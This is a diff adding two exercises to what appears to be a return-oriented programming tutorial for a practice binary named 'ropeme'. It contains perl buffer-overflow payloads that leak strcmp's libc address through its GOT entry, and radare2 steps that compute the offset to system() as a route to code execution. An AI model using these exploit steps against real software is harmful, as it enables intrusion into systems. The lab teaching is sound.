@@ -428,4 +428,111 @@ input just after:
     Hello World!
     Segmentation fault
 
-Working!
+Working! That way we can chain function calls at will!
+
+Exercise 7
+==========
+
+As strcmp comes from the libc it is dynamically loaded. That means that the
+address of the real strcmp function isn't know at compile time. The jump is
+made from the PLT section into the GOT section. To know at which address we
+jump we just have to ask radare2:
+
+::
+
+    $ rabin2 -s ropeme | grep strcmp
+    vaddr=0x08048310 paddr=0x00000310 ord=001 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.strcmp
+
+So the strcmp address in the PLT is 0x08048310. Where does it jump after that?
+
+::
+
+    $ r2 -q -d -c 'dc;pd 1 @ 0x08048310' rarun2 program=ropeme arg1=admin42
+        ...
+    0x08048310    ff25d0980408   jmp qword [rip + 0x80498d0]   ; [0x10091be6:8]=-1
+
+We now know that the jump in the GOT is done at the address 0x80498d0 for
+strcmp. At this address will be dynamically decided the address of the strcmp
+function in the dynamically loaded libc. We can print it using our puts
+payload from exercise 5:
+
+::
+
+    # Stack wanted:
+    #
+    # ^ [strcmp GOT  address] = 0x080498d0
+    # | [puts return address] = 0x08048521
+    # | [puts        address] = 0x08048330
+    # | [padding to overflow] = "A" x 92
+
+    $ perl -e 'print "A"x92 . "\x30\x83\x04\x08\x21\x85\x04\x08\xd0\x98\x04\x08"' | ./ropeme admin42
+    Enter password: Wrong password
+    ��V�P�\�
+    Segmentation fault (core dumped)
+
+    $ perl -e 'print "A"x92 . "\x30\x83\x04\x08\x21\x85\x04\x08\xd0\x98\x04\x08"' | ./ropeme admin42
+    Enter password: Wrong password
+    �e�P�k�
+    Segmentation fault (core dumped)
+
+    $ perl -e 'print "A"x92 . "\x30\x83\x04\x08\x21\x85\x04\x08\xd0\x98\x04\x08"' | ./ropeme admin42
+    Enter password: Wrong password
+    �`�P�f�
+    Segmentation fault (core dumped)
+
+The first 4 bytes of the oddly displayed line are our address. As you can see
+the address changes from one call to the other. Let's use strace to see it
+more clearly:
+
+::
+
+    $ perl -e 'print "A"x92 . "\x30\x83\x04\x08\x21\x85\x04\x08\xd0\x98\x04\x08"' |\
+      strace -e write ./ropeme admin42
+    [ Process PID=14860 runs in 32 bit mode. ]
+    write(1, "Enter password:\n", 16Enter password:
+    )       = 16
+    write(1, "Wrong password\n", 15Wrong password
+    )        = 15
+    write(1, "\300\264Y\367P\322_\367\n", 9�Y�P�_�
+    ) = 9
+    --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x41414141} ---
+    +++ killed by SIGSEGV +++
+    Segmentation fault
+
+    $ printf "\300\264Y\367" | xxd
+    0000000: c0b4 59f7                                ..Y.
+
+So our address is 0xf759b4c0 in that instance.
+
+Exercise 8
+==========
+
+This address is interesting because the offset between two libc functions
+will always be the same so we can compute the offset to between strcmp and
+any other function and use it to determine the address of any other function.
+
+We'll start by computing the offset between system and strcmp in the libc.
+Here I take advantage of the fact that I know that the libc that is compiled
+is the same than the one used by my system, in the real world you may want to
+identify the serveur running and download its standard precompiled libc for
+example.
+
+::
+
+    $ r2 /lib/libc-2.22.so
+    [0x00020730]> is | grep =system
+    vaddr=0x0003f890 paddr=0x0003f890 ord=5724 fwd=NONE sz=45 bind=UNKNOWN type=FUNC name=system
+    [0x00020730]> is | grep =strcmp
+    vaddr=0x0007f650 paddr=0x0007f650 ord=5510 fwd=NONE sz=60 bind=GLOBAL type=LOOS name=strcmp
+    [0x00020730]> ? 0x0007f650 - 0x0003f890
+    261568 0x3fdc0 0776700 255.4K 3000:0dc0 261568 11000000 261568.0 0.000000f 0.000000
+
+So the offset between strcmp and system is 0x3fdc0.
+
+Of course having it for a paste instance is quite useless, we must now find
+a way to use it without quitting the process. There are two strategies:
+either we stay within the program and build the address by using ROP gadgets
+astuciously, either we consider use the program as a server, have it output
+the address, compute the offset outside the process and then have the process
+read the new address back.
+
